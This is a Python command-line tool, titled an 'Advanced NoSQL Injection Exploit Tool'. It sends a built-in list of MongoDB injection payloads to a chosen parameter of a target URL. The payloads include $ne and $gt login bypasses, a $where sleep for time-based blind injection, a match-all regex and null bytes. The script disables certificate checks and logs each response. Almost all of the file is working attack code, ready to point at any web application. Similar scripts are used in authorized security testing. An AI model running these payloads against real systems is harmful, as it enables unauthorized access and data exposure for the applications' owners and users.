import requests
import argparse
import json
import logging

# Disable SSL warnings for self-signed certificates
requests.packages.urllib3.disable_warnings()

# Set up logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(message)s")
logger = logging.getLogger(__name__)

# Define more advanced NoSQL injection payloads
payloads = [
    # Boolean Bypass
    {"$ne": None},
    {"$ne": ""},
    
    # Object Injection
    {"$gt": ""},
    {"$gte": "0"},
    
    # Deeply Nested
    {"$not": {"$gt": ""}},
    {"$in": ["value1", "value2", None]},
    
    # Array Injection
    {"$in": [[], {}, None]},
    
    # Bypassing with $size
    {"$size": 0},
    {"$size": {"$ne": 0}},
    
    # Blind Time-Based Exploitation (MongoDB-specific)
    {"$where": "function() { sleep(5000); return true; }"},
    
    # Field Extraction
    {"$where": "this.userId.length > 0"},
    {"$or": [{"userId": "known_user"}, {"password": {"$ne": "known_password"}}]},
    
    # String Matching
    {"$regex": "^.*$"},
    
    # Combined Logical Operators
    {"$and": [{"param": {"$ne": None}}, {"another_param": {"$ne": ""}}]},
    
    # Null Byte Injection
    {"param": "\x00"}
]

# Function to send GET or POST requests and inject payloads
def send_request(method, url, headers, data, proxies=None):
    try:
        if method == 'POST':
            logger.debug(f"POST request to {url} with data: {json.dumps(data)}")
            response = requests.post(url, headers=headers, json=data, proxies=proxies, verify=False)
        elif method == 'GET':
            logger.debug(f"GET request to {url} with params: {data}")
            response = requests.get(url, headers=headers, params=data, proxies=proxies, verify=False)
        
        logger.info(f"Response [HTTP {response.status_code}]: {response.text}")
        return response
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed: {e}")
        return None

# Function to inject payload into specified parameter and test for NoSQLi
def test_nosqli(method, url, headers, original_data, target_param, proxies=None):
    logger.info(f"Starting NoSQL injection tests for parameter '{target_param}'")

    for payload in payloads:
        # Create a copy of the original data and inject the payload into the target parameter
        injected_data = original_data.copy()

        # Replace the target parameter with the payload
        if target_param in injected_data:
            injected_data[target_param] = payload  # Directly assign the payload
        else:
            logger.error(f"Target parameter '{target_param}' does not exist in the request data.")
            return
        
        logger.debug(f"Testing payload: {json.dumps(payload)}")

        # Send the modified request with the injected payload
        send_request(method, url, headers, injected_data, proxies)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced NoSQL Injection Exploit Tool")

    # Arguments for HTTP method, URL, data, headers, target parameter, and proxy
    parser.add_argument("-m", "--method", required=True, choices=["GET", "POST"], help="HTTP method (GET or POST)")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-d", "--datafile", required=True, help="Path to JSON file for POST data or GET parameters")
    parser.add_argument("-H", "--headersfile", required=True, help="Path to JSON file for headers")
    parser.add_argument("-t", "--target", required=True, help="The parameter to inject the payload into")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")

    args = parser.parse_args()

    # Load POST data or GET params and headers from the provided JSON files
    with open(args.datafile, 'r') as f:
        request_data = json.load(f)
    
    with open(args.headersfile, 'r') as f:
        headers = json.load(f)
    
    # Proxy settings (if provided)
    proxies = {
        "http": args.proxy,
        "https": args.proxy
    } if args.proxy else None

    # Start testing for NoSQL injection by injecting payloads into the target parameter
    test_nosqli(args.method, args.url, headers, request_data, args.target, proxies)
